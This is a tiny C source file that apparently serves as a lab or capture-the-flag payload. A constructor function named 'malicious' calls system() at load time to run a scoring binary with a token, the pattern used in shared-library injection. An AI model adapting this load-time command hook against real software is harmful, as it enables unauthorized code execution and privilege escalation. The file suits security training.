#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 1b02795d-23c3-42f6-83b6-aec6baa53bcc");
}

